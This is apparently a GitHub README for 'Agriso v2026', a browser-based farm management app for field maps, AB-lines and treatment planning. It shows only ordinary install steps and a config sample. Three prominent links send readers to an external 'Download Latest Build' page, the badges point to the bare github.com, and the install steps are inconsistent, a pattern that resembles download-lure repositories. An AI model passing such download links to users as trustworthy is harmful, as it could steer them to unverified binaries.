# Agriso v2026 - farm management web app 2026

> **Agriso is a browser-based farm management application built on Blazor and ASP.NET Core, designed for managing fields, planning treatments, and working with mapped agricultural data in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/lewisowen1998/agriso-aspnet-farm-suite?style=flat-square)](https://github.com/lewisowen1998/agriso-aspnet-farm-suite)

---

<p align="center">
  <a href="https://lewisowen1998.github.io/agriso-aspnet-farm-suite/">
    <img src="https://img.shields.io/badge/Download-Agriso%20Latest-brightgreen?style=for-the-badge" alt="Download Agriso">
  </a>
</p>

> **[Download Latest Build - Agriso v2026](https://lewisowen1998.github.io/agriso-aspnet-farm-suite/)**

---

[Download Latest Build](https://lewisowen1998.github.io/agriso-aspnet-farm-suite/)

---

## What Agriso Does

Agriso provides a field-oriented workspace for agricultural planning and map-driven record keeping. It brings together an interactive map, tools for field objects, waylines, AB-lines, and treatment planning so farm-related information can stay organized in one place.

The app is intended for users who need to manage field geometry and move data between common agriculture formats. With GeoJSON, Shapefile, and ISOXML-focused workflows, Agriso bridges visual planning and data import or export in a browser-friendly interface.

---

## Key Capabilities

- Interactive field map for visual farm work
- Import and export support for field data
- Wayline and AB-line management
- Field object marking for map-based annotations
- Treatment planning and sharing workflows
- Mobile responsive interface for use on different screen sizes
- Built-in farming calculators for common planning tasks
- PWA-oriented web experience for convenient access

---

## Installation

Clone the repository and open the project in your preferred .NET development setup.

1. Download or clone the source:
   - `git clone https://github.com/lewisowen1998/agriso-aspnet-farm-suite.git
2. Open the Agriso project folder:
   - `cd Agriso`
3. Restore and run the web app with your ASP.NET Core tooling:
   - `dotnet restore`
   - `dotnet run`

If you are using a published build, start the web application through the provided host entry point or deployment package.

---

## Using the App

Once Agriso is running, open the map view to review fields and start editing field-related information.

Typical workflow:
1. Load or create a field dataset.
2. Place objects, define AB-lines, or add waylines on the map.
3. Import or export data using supported agriculture file formats.
4. Prepare treatment plans and share them as needed.
5. Use the calculators for quick planning and measurement support.

For mobile use, open the app in a browser on a smaller screen and work with the responsive interface.

---

## Configuration

Most settings are handled through the application configuration used by ASP.NET Core and the local data store.

Example configuration areas:

    {
      "ConnectionStrings": {
        "DefaultConnection": "Data Source=agriso.db"
      },
      "AppSettings": {
        "MapProvider": "Leaflet",
        "EnablePwa": true
      }
    }

Common areas to review:
- database path or connection string for SQLite
- map and layer settings
- import and export options
- treatment planning preferences

---

## Requirements

- Web browser with modern HTML and JavaScript support
- ASP.NET Core runtime for hosting the application
- Blazor-compatible environment
- SQLite for local data storage
- Access to mapped field data when importing or exporting
- Optional support for GeoJSON, Shapefile, and ISOXML workflows

---

## FAQ

**How do I get updates?**  
Use the latest build link above or pull the newest repository changes before starting a new deployment.

**Where are my settings stored?**  
Configuration is typically handled in the app settings and the project data store, depending on how you host Agriso.

**Can I use this on mobile devices?**  
Yes. The interface is designed to adapt to smaller screens and browser-based mobile use.

**What should I do if imports fail?**  
Check the file format, confirm the source data structure, and verify that the selected import path matches the supported workflow.

**Is support included?**  
Support depends on the repository maintainer and the hosting setup you are using.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
